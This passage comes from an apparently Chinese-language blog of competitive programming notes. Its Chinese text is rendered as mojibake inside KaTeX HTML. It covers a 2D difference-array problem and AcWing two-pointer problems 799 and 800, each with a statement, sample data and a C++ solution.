class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1000</mn><mo>â‰¤</mo><mi>c</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le c \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1000</mn><mo>â‰¤</mo><mtext>çŸ©é˜µå†…å…ƒç´ çš„å€¼</mtext><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le çŸ©é˜µå†…å…ƒç´ çš„å€¼ \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">çŸ©é˜µå†…å…ƒç´ çš„å€¼</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>3 4 31 2 2 13 2 2 11 1 1 11 1 2 2 11 3 2 3 23 1 3 4 1</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>2 3 4 14 3 4 12 2 2 2</code></pre><h3 id="äºŒç»´å·®åˆ†">äºŒç»´å·®åˆ†</h3><blockquote><p>å¦‚æœè¦å°†äºŒç»´æ•°ç»„ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œå†™æ³•ä¸º <code>void insert(int (*b)[N], int x1, int y1, int x2, int y2, int c) </code><br>äºŒç»´æ•°ç»„çš„ä¼ æ³•:ç¬¬äºŒç»´çš„å¤§å°å¿…é¡»ä¼ é€’ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> a[kN][kN], b[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> x1, <span class="type">int</span> y1, <span class="type">int</span> x2, <span class="type">int</span> y2, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">  b[x1][y1] += c;</span><br><span class="line">  b[x2 + <span class="number">1</span>][y1] -= c;</span><br><span class="line">  b[x1][y2 + <span class="number">1</span>] -= c;</span><br><span class="line">  b[x2 + <span class="number">1</span>][y2 + <span class="number">1</span>] += c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m, q;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line">      <span class="built_in">insert</span>(i, j, i, j, a[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">    <span class="type">int</span> x1, y1, x2, y2, c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d%d&quot;</span>, &amp;x1, &amp;y1, &amp;x2, &amp;y2, &amp;c);</span><br><span class="line">    <span class="built_in">insert</span>(x1, y1, x2, y2, c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      b[i][j] += b[i - <span class="number">1</span>][j] + b[i][j - <span class="number">1</span>] - b[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="åŒæŒ‡é’ˆç®—æ³•">åŒæŒ‡é’ˆç®—æ³•</h1><h2 id="AcWing-799-æœ€é•¿è¿ç»­ä¸é‡å¤å­åºåˆ—"><a href="https://www.acwing.com/problem/content/801/">AcWing 799. æœ€é•¿è¿ç»­ä¸é‡å¤å­åºåˆ—</a></h2><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„æ•´æ•°åºåˆ—ï¼Œè¯·æ‰¾å‡ºæœ€é•¿çš„ä¸åŒ…å«é‡å¤çš„æ•°çš„è¿ç»­åŒºé—´ï¼Œè¾“å‡ºå®ƒçš„é•¿åº¦ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼ˆå‡åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>âˆ¼</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">0 \sim 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span> èŒƒå›´å†…ï¼‰ï¼Œè¡¨ç¤ºæ•´æ•°åºåˆ—ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å«ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€é•¿çš„ä¸åŒ…å«é‡å¤çš„æ•°çš„è¿ç»­åŒºé—´çš„é•¿åº¦ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1 \le n \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>51 2 2 3 5</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>3</code></pre><h3 id="åŒæŒ‡é’ˆç®—æ³•-2">åŒæŒ‡é’ˆç®—æ³•</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  </span><br><span class="line">  unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">    hash[a[j]]++;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j &amp;&amp; hash[a[j]] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      hash[a[i]]--;</span><br><span class="line">      i++;</span><br><span class="line">    &#125;</span><br><span class="line">    res = <span class="built_in">max</span>(res, j - i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é˜Ÿåˆ—ç­‰ä»·">é˜Ÿåˆ—ç­‰ä»·</h3><p><strong>åŒæŒ‡é’ˆç®—æ³•</strong> å’Œ <strong>åŒå‘é˜Ÿåˆ—</strong> æ˜¯ç­‰ä»·çš„ï¼Œä½†æ˜¯ä½¿ç”¨ <strong>åŒæŒ‡é’ˆ</strong> èƒ½çµæ´»é«˜æ•ˆã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;  <span class="comment">// ä¸èƒ½for (auto x: a)</span></span><br><span class="line">  <span class="type">int</span> x = a[i];</span><br><span class="line">  q.<span class="built_in">push</span>(x);</span><br><span class="line">  hash[x]++;</span><br><span class="line">  <span class="keyword">while</span> (q.<span class="built_in">size</span>() &amp;&amp; hash[q.<span class="built_in">back</span>()] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    hash[q.<span class="built_in">front</span>()]--;</span><br><span class="line">    q.<span class="built_in">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  res = <span class="built_in">max</span>(res, (<span class="type">int</span>)q.<span class="built_in">size</span>());  <span class="comment">// å¾—è½¬int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-800-æ•°ç»„å…ƒç´ çš„ç›®æ ‡å’Œ"><a href="https://www.acwing.com/problem/content/802/">AcWing 800. æ•°ç»„å…ƒç´ çš„ç›®æ ‡å’Œ</a></h2><p>ç»™å®šä¸¤ä¸ªå‡åºæ’åºçš„æœ‰åºæ•°ç»„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ï¼Œä»¥åŠä¸€ä¸ªç›®æ ‡å€¼ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>ã€‚</p><p>æ•°ç»„ä¸‹æ ‡ä» <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> å¼€å§‹ã€‚</p><p>è¯·ä½ æ±‚å‡ºæ»¡è¶³ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>+</mo><mi>B</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">A[i] + B[j] = x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> çš„æ•°å¯¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i, j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>ã€‚</p><p>æ•°æ®ä¿è¯æœ‰å”¯ä¸€è§£ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸‰ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo separator="true">,</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">n,m,x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span></span></span></span>ï¼Œåˆ†åˆ«è¡¨ç¤º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> çš„é•¿åº¦ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> çš„é•¿åº¦ä»¥åŠç›®æ ‡å€¼ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ•°ç»„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>ã€‚</p><p>ç¬¬ä¸‰è¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ•°ç»„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ä¸è¶…è¿‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span>ã€‚<br>åŒä¸€æ•°ç»„å†…å…ƒç´ å„ä¸ç›¸åŒã€‚<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mtext>æ•°ç»„å…ƒç´ </mtext><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le æ•°ç»„å…ƒç´  \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">æ•°ç»„å…ƒç´ </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>4 5 61 2 4 73 4 6 8 9</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>1 1</code></pre><h3 id="åŒæŒ‡é’ˆ">åŒæŒ‡é’ˆ</h3><p>é¢˜ç›®è¦æ±‚åªæœ‰ä¸€å¯¹ï¼Œä½†åªè¦ä»£ç 18è¡Œä¸breakæ‰ï¼Œæ˜¯å¯ä»¥æ‰¾å‡ºæ‰€æœ‰å¯¹çš„ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], b[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m, x;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;x);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i]);</span><br><span class="line">  </span><br><span class="line">  <span 